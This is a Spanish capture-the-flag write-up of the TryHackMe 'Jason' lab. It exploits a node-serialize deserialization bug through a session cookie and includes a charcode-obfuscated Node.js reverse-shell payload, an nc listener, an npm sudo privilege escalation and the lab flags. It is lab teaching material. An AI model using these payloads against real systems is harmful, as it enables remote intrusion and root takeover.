<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <title>Tryhackme Jason &#8211; Jh3x</title> <meta name="description" content="WriteUp máquina Jason"> <meta name="keywords" content=""> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="halve.png"> <meta name="twitter:title" content="Tryhackme Jason"> <meta name="twitter:description" content="WriteUp máquina Jason"> <!-- Open Graph --> <meta property="og:locale" content="en_ES"> <meta property="og:type" content="article"> <meta property="og:title" content="Tryhackme Jason"> <meta property="og:description" content="WriteUp máquina Jason"> <meta property="og:url" content="http://localhost:4000/TryHackMe-Jason/"> <meta property="og:site_name" content="Jh3x"> <meta property="og:image" content="http://localhost:4000/images/halve.png"> <link rel="canonical" href="http://localhost:4000/TryHackMe-Jason/"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Feed --> <!-- Favicons --> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- CSS --> <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css"> <!-- Left Block Image for Posts --> <style type="text/css"> #posts.inner-post-page .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/home.png) no-repeat;background-size: cover;} </style> <!-- Left Block Images for Home and Pages --> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/home.png) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/images/home.png) no-repeat;background-size: cover;} </style> </head> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/home.png) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/images/home.png) no-repeat;background-size: cover;} </style> <body id="posts" class="inner-post-page"> <div class="block-left"> <div class="content"> <a href="http://localhost:4000" class="logo"><img src="http://localhost:4000/images/halve.png"></a> <div class="post-title-section"> <div class="section-line">Posts<em>/</em></div> <h1 class="section-title">Tryhackme Jason </h1> <ul class="tags"> </ul> <div class="section-line reverse"><a href="http://localhost:4000/posts"> Volver </a> <em>/</em></div> </div> </div> </div> <canvas></canvas> <div class="block-right"> <div class="share-buttons"> </div> <a href="http://localhost:4000/posts" title="posts" class="posts-menu-icon"></a> <span class="posts-link">|-WriteUpS-|</span> <a title="projects" class="projects-menu-icon"> <span></span> </a> <span class="projects-link">|-ArtS-|</span> <span></span> </a> <div class="inner-post content"> <div class="date-highlight">09 Feb 2022</div> <h2 id="writeup-máquina-jason">WriteUp máquina <strong>Jason</strong></h2> <p>Esta es una maquina con un nivel de dificultad Fácil en TryHackme vamos a ello:</p> <h3 id="fase-de-reconocimineto">Fase de reconocimineto</h3> <p>Como primer paso realizamos un ping a la maquina para identificar ante que maquina estamos:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PING 10.10.58.237 (10.10.58.237) 56(84) bytes of data.
64 bytes from 10.10.58.237: icmp_seq=1 ttl=63 time=307 ms
</span></code></pre></div></div> <p>Como observamos la maquina nos responde con un TTL=63 por lo que nos enfrentamos a una maquina linux.</p> <p>El siguiente paso es ver que puertos abiertos tiene la maquina por lo que realizamos el siguiente escaneo:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.58.237 -oG allPorts
</span></code></pre></div></div> <p>Y vemos los siguientes puertos abiertos:</p> <table> <tbody> <tr> <td><strong>PORT</strong></td> <td><strong>STATE</strong></td> <td><strong>SERVICE</strong></td> <td>**REASON **</td> </tr> <tr> <td>22/tcp</td> <td>open</td> <td>ssh</td> <td>syn-ack ttl 63</td> </tr> <tr> <td>80/tcp</td> <td>open</td> <td>http</td> <td>syn-ack ttl 63</td> </tr> </tbody> </table> <p>Teniendo los puertos abiertos identificamos la version de los servicios expuestos con el siguiente comando:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -sC -sV -p22,80 10.10.58.237 -oN targeted
</span></code></pre></div></div> <p>Dando como resultado los siguientes servicios:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">PORT   STATE SERVICE VERSION                                                                                                                                                               
</span><span class="gp">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>                                                                                                          
<span class="go">| ssh-hostkey:                                                                                                                                                                             
|   3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA)                                                                                                                             
|   256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA)                                                                                                                            
|_  256 12:ab:13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519)                                                                                                                          
80/tcp open  http                                                                                                                                                                          
| fingerprint-strings:                                                                                                                                                                     
|   GetRequest, HTTPOptions:                                                                                                                                                               
|     HTTP/1.1 200 OK                                                                                                                                                                      
|     Content-Type: text/html                                                                                                                                                              
|     Date: Wed, 09 Feb 2022 21:12:16 GMT                                                                                                                                                  
|     Connection: close                                                                                                                                                                    
</span><span class="gp">|     &lt;html&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>                                                                                                                                                                         
<span class="gp">|     &lt;title&gt;</span>Horror LLC&lt;/title&gt;                                                                                                                                                            
<span class="gp">|     &lt;style&gt;</span><span class="w">                                                                                                                                                                              
</span><span class="go">|     body {                                                                                                                                                                               
</span><span class="gp">|     background: linear-gradient(253deg, #</span>4a040d, <span class="c">#3b0b54, #3a343b);                                                                                                                      </span>
<span class="gp">|     background-size: 300% 300%;</span><span class="w">                                                                                                                                                          
</span><span class="gp">|     -webkit-animation: Background 10s ease infinite;</span><span class="w">
</span><span class="gp">|     -moz-animation: Background 10s ease infinite;</span><span class="w">
</span><span class="gp">|     animation: Background 10s ease infinite;</span><span class="w"> 
</span><span class="go">|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-title: Horror LLC

</span></code></pre></div></div> <p>Como podemos observar existe un servicio web por lo que inspeccionamos el servicio en el puerto 80</p> <p><img src="/images/writeup/jason/panel.png" alt="Panel" /></p> <p>Vemos que el sitio web menciona que esta hecho con nodejs (<strong>Built with Nodejs</strong>) por lo que lo tenemos encuenta para las posteriores fases.</p> <h3 id="fase-de-explotacion">Fase de explotacion</h3> <p>Despues de revisar la funcionalidad del sitio web observamos que al poner un correo en el campo de email address, se nos asigna una cookie donde el valor de session es una cadena en base64 si la decodificamos resulta ser el texto que pusimos de entrada por lo que nos indica que hay algun tipo de procesamiento de los datos como se muestra en la siguiente imagen:</p> <p><img src="/images/writeup/jason/base64.png" alt="Panel" /></p> <p>Por lo que con los datos hasta ahora ya podriamos deducir el vector de ataque.<br /> Si buscamos exploit por la web referentes a Nodejs hay uno que llama la atención que es un exploit que permite la ejecución remota de comandos mediante la deserializacion de los datos tramitados para mas detalles puedes ver el siguiente link: <br /> <strong><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">Deserialization exploit</a></strong>.</p> <p>Para replicar este exploit basicamente necesitamos desarrollar los siguientes pasos:</p> <h3 id="1-serializar-los-datos">[1] Serializar los datos</h3> <p>Para ello podemos hacer uso del script <strong>serialize.js</strong>:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">{</span>
<span class="na">rce</span> <span class="p">:</span> <span class="kd">function</span><span class="p">(){</span>
<span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">whoami</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span><span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">)</span> <span class="p">});</span>
    <span class="p">},</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Serialized: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">serialize</span><span class="p">(</span><span class="nx">y</span><span class="p">));</span>
</code></pre></div></div> <p>es importante tener npm installado y la libreria node-serialize:</p><pre><code class="language-code">npm install node-serialize
</code></pre><p>Si todo va bien hasta este punto al correr el siguiente comando:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">node serialize.js
</span></code></pre></div></div> <p>deberia dar como resultado la siguiente salida:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){</span><span class="se">\n</span><span class="s2">require('child_process').exec('whoami', function(error,stdout, stderr) { console.log(stdout) });</span><span class="se">\n</span><span class="s2">}</span><span class="dl">"</span><span class="p">}</span>
</code></pre></div></div> <h3 id="2-deseralizar-datos">[2] Deseralizar datos</h3> <p>Hasta este punto tendriamos los datos serializados pero recordemos que el servidor hace el proceso inverso es decir deserializar los datos por lo que creamos el archivo <strong>unserialize.js</strong>:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">{"rce":"_$$ND_FUNC$$_function(){require(</span><span class="se">\'</span><span class="s1">child_process</span><span class="se">\'</span><span class="s1">).exec(</span><span class="se">\'</span><span class="s1">whoami</span><span class="se">\'</span><span class="s1">, function(error,stdout, stderr) { console.log(stdout) });}()"}</span><span class="dl">'</span>
<span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>
</code></pre></div></div> <p>Si ejecutamos este script con node podriamos observar en nuestro sistema que tenemos la capacidad de ejecutar comandos:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ node unserialize.js 
root
</span></code></pre></div></div> <h3 id="3-obtener-una-shell-reversa">[3] Obtener una shell reversa</h3> <p>Ahora que tenemos toda la estructura armada buscamos la forma de entablar una reverse shell a nuestra maquina, para ello el articulo <strong><a href="https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf">Deserialization exploit</a></strong> que mencionamos tiene una utilidad para obtener una reverse shell mediante js la cual esta disponible en: <strong><a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">NodeJS Shell</a></strong></p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ python2 nodejsshell.py IP 4444                             
[+] LHOST = IP
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,51,46,57,52,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
</span></code></pre></div></div> <p>Luego copiamos el payload generado desde de la siguiente manera:<br /> Ejemplo:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){&lt;Payload generado&gt;}()</span><span class="dl">"</span><span class="p">}</span>
</code></pre></div></div> <p>Aplicando:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,51,46,57,52,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()</span><span class="dl">"</span><span class="p">}</span>
</code></pre></div></div> <p>Teniendo este payload lo guardamos en un archivo cualquiera en este caso yo lo llame <strong>UnserevShell.js</strong> y lo codificamos en base64:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go"> root@parrot ▓▒░  cat  UnserevShell.js | base64 -w 0 |xclip -sel clip
</span></code></pre></div></div> <p>Lo ponemos en la web en este caso yo lo puse con un editor de cookies:</p> <p><img src="/images/writeup/jason/base64Cod.png" alt="Panel" /></p> <p>Y recargando la pagina tenemos una flamante reverse shell, asi que realizamos el tratamiento de la tty:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">root@parrot ▓▒░ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.58.237 55210
Connected!
script /dev/null -c bash
Script started, file is /dev/null
</span><span class="gp">dylan@jason:/opt/webapp$</span><span class="w"> </span>^Z
<span class="go">zsh: suspended  nc -nlvp 4444

</span><span class="gp">root@parrot ▓▒░ stty raw -echo;</span><span class="w"> </span><span class="nb">fg</span>
<span class="go">[1]  + continued  nc -nlvp 4444
                               reset xterm
</span></code></pre></div></div> <p>Exportamos las variables de entorno:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dylan@jason:/opt/webapp$</span><span class="w"> </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="gp">dylan@jason:/opt/webapp$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
</code></pre></div></div> <p>Y podemos ver la flag del usuario:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">0ba48780dee9f5677a4461f588af217c
</span></code></pre></div></div> <h3 id="escalada-de-privilegios">Escalada de privilegios</h3> <p>Como primer paso en la escalada de privilegios escribimos el comando <code class="language-plaintext highlighter-rouge">console sudo -l</code> para ver que comandos podemos ejecutar como otros usuarios en este caso tenemos lo siguiente:</p> <p><img src="/images/writeup/jason/sudo.png" alt="Panel" /></p> <p>Buscamos algun vector para escalar privilegios en este caso encontre una en la siguiente pagina: <strong><a href="https://gtfobins.github.io/gtfobins/npm/#sudo">npm-sudo-exploit</a></strong></p> <p>Como podemos ver la escalada de privilegios simplemente consistira en ejecutar los siguiente pasos:</p> <p>Nos dirigimos a un directorio con permisos de escritura y creamos un archivo en:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">dylan@jason:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'{"scripts": {"preinstall": "/bin/sh"}}'</span> <span class="o">&gt;</span> /tmp/package.json 
<span class="gp">dylan@jason:~$</span><span class="w"> </span><span class="nb">sudo </span>npm <span class="nt">-C</span> /tmp <span class="nt">--unsafe-perm</span> i
</code></pre></div></div> <p>y obtenemos acceso root pudiendo ver la flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2cd5a9fd3a0024bfa98d01d69241760e
</span></code></pre></div></div> <br> <nav class="pagination"> <a href="http://localhost:4000/TryHackMe-Magician/" class="pagination_pager" title="Tryhackme Magician ">previous</a> <a href="#" class="pagination_pager disabled">next</a> </nav> </div> </div> <!-- JS --> <script src="http://localhost:4000/assets/js/main.min.js"></script> <div class="overlay"> <ul class="projects-menu"> <li style="background:url(https://raw.githubusercontent.com/TaylanTatli/Ramme/master/assets/img/screenshot-post.png) center center no-repeat;"> <a href="https://github.com/Jh3xX/Tools/blob/main/README.md" target="_blank" rel="nofollow external"> <span> Formas de Relizar un host Discovery </span> </a> </li> </ul> </div> <script src="http://localhost:4000/assets/js/canvas.js"></script> </body> </html>
